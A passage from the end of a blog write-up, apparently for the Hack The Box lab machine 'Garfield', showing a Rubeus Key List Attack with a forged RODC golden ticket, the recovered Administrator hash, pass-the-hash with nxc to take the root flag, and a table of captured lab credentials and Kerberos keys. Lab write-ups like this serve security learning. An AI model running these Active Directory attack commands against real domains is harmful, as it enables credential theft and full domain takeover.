+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> &gt; /tmp/keylist3.bat &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cd</span> C:\Users\l.wilson_adm\Desktop</span><br><span class="line"><span class="built_in">set</span> TKT=doIFkjCCBY6gAwIBBaEDAgEWooIEfzCCBHthggR3MIIEc6ADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+...</span><br><span class="line">.\Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/garfield.htb ^</span><br><span class="line">    /dc:DC01.garfield.htb /ticket:%TKT% /nowrap &gt; kl3.log 2&gt;&amp;1</span><br><span class="line"><span class="built_in">type</span> kl3.log</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Action: Ask TGS</span><br><span class="line">[*] Building KeyList TGS-REQ request <span class="keyword">for</span>: <span class="string">&#x27;Administrator&#x27;</span></span><br><span class="line">[*] Using domain controller: DC01.garfield.htb</span><br><span class="line">[+] TGS request successful!</span><br><span class="line"></span><br><span class="line">UserName                 :  Administrator (NT_PRINCIPAL)</span><br><span class="line">KeyType                  :  aes256_cts_hmac_sha1</span><br><span class="line">Password Hash            :  EE238F6DEBC752010428F20875B092D5</span><br></pre></td></tr></table></figure></div>
+
+<p>There it is — <strong>Administrator NT hash: <code>EE238F6DEBC752010428F20875B092D5</code></strong>.</p>
+<p>Worth noting <em>why</em> this attack works and the more obvious ones don’t: <code>lsadump::dcsync</code> from SYSTEM on the RODC fails with <code>0x2105</code> because RODC$ doesn’t have full replication rights, and <code>lsadump::netsync</code> fails with <code>STATUS_NO_TRUST_SAM_ACCOUNT</code> because RODC machine accounts don’t speak the regular netlogon trust protocol. The Key List Attack is a legitimate part of the Kerberos protocol that DCs implement specifically so RODCs can fetch keys for accounts in their PRP — we’re just signing the request with <code>krbtgt_8245</code> ourselves.</p>
+<h2 id="Pass-the-Hash-Root"><a href="#Pass-the-Hash-Root" class="headerlink" title="Pass-the-Hash -&gt; Root"></a>Pass-the-Hash -&gt; Root</h2><p>With the Administrator NT hash, the rest is a formality. Confirm it works:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nxc winrm 10.129.26.128 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;EE238F6DEBC752010428F20875B092D5&#x27;</span></span><br><span class="line"></span><br><span class="line">WINRM  10.129.26.128  5985  DC01  [+] garfield.htb\Administrator:EE238F6DEBC752010428F20875B092D5 (Pwn3d!)</span><br></pre></td></tr></table></figure></div>
+
+<p>Then psexec to DC01 with the hash, dump the root flag to a temp file and pull it back over SMB:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.129.26.128 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;EE238F6DEBC752010428F20875B092D5&#x27;</span> \</span><br><span class="line">    --share C$ --get-file <span class="string">&#x27;Windows\Temp\r2.txt&#x27;</span> /tmp/r2.txt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> /tmp/r2.txt</span><br><span class="line">1cefa5cd03367c422d05d96e75c18e7b</span><br></pre></td></tr></table></figure></div>
+
+<p>And that’s root. </p>
+<h2 id="Credentials-Captured"><a href="#Credentials-Captured" class="headerlink" title="Credentials Captured"></a>Credentials Captured</h2><table>
+<thead>
+<tr>
+<th>Principal</th>
+<th>Secret</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>j.arbuckle</code></td>
+<td><code>Th1sD4mnC4t!@1978</code></td>
+<td>Given</td>
+</tr>
+<tr>
+<td><code>l.wilson_adm</code></td>
+<td><code>Hacked123!</code></td>
+<td>Logon-script password reset via l.wilson</td>
+</tr>
+<tr>
+<td><code>FAKE$</code></td>
+<td><code>FakePass123!</code></td>
+<td>Created via <code>impacket-addcomputer</code></td>
+</tr>
+<tr>
+<td><code>krbtgt_8245</code></td>
+<td>NTLM <code>445aa4221e751da37a10241d962780e2</code></td>
+<td>secretsdump (RODC NTDS)</td>
+</tr>
+<tr>
+<td><code>krbtgt_8245</code></td>
+<td>AES256 <code>d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240</code></td>
+<td>mimikatz <code>lsadump::lsa /inject</code></td>
+</tr>
+<tr>
+<td><code>Administrator</code></td>
+<td>NTLM <code>EE238F6DEBC752010428F20875B092D5</code></td>
+<td>Rubeus Key List Attack</td>
+</tr>
+</tbody></table>
+<h2 id="Final-Thoughts"><a href="#Final-Thoughts" class="headerlink" title="Final Thoughts"></a>Final Thoughts</h2><p>Garfield is a great box if you want to actually understand RODCs rather than just read about them. The foothold is a clean, self-contained logon-script abuse, but the real meat is everything around the RODC — RBCD to get a foothold on it, then the golden ticket + Key List Attack to walk back up to the real Administrator. The supporting tricks (libfaketime for the clock skew, chisel for the pivot, and the user-namespace + socat dance to bind 445 without root) are the kind of thing that are annoying the first time and second nature after. Fun box, thanks for reading!</p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li>RODC Golden Tickets: <a class="link"   target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/rodc-golden-tickets" >https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/rodc-golden-tickets <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>Kerberos Key List Attack: <a class="link"   target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/credentials/dumping/kerberos-key-list" >https://www.thehacker.recipes/ad/movement/credentials/dumping/kerberos-key-list <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>At the Edge of Tier Zero (RODCs): <a class="link"   target="_blank" rel="noopener" href="https://specterops.io/blog/2023/01/25/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc/" >https://specterops.io/blog/2023/01/25/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>Resource-Based Constrained Delegation: <a class="link"   target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" >https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Garfield</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-11-07 16:30:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-11-07 22:00:37
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/11/07/Hackthebox-Garfield/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/11/02/Hackthebox-MakeSense/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: MakeSense</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Garfield</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Foothold-Logon-Script-Abuse"><span class="nav-text">Foothold - Logon Script Abuse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-as-l-wilson-adm"><span class="nav-text">Enumeration as l.wilson_adm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RBCD-Against-RODC01"><span class="nav-text">RBCD Against RODC01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Getting-the-S4U-Ticket-and-the-clock-skew-problem"><span class="nav-text">Getting the S4U Ticket (and the clock skew problem)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tunneling-to-the-Internal-Subnet"><span class="nav-text">Tunneling to the Internal Subnet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SYSTEM-on-RODC01"><span class="nav-text">SYSTEM on RODC01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dumping-the-krbtgt-8245-AES256-Key"><span class="nav-text">Dumping the krbtgt_8245 AES256 Key</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Modifying-the-RODC-Password-Replication-Policy"><span class="nav-text">Modifying the RODC Password Replication Policy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RODC-Golden-Ticket-Key-List-Attack"><span class="nav-text">RODC Golden Ticket + Key List Attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-the-Hash-Root"><span class="nav-text">Pass-the-Hash -&gt; Root</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Credentials-Captured"><span class="nav-text">Credentials Captured</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Final-Thoughts"><span class="nav-text">Final Thoughts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#References"><span class="nav-text">References</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
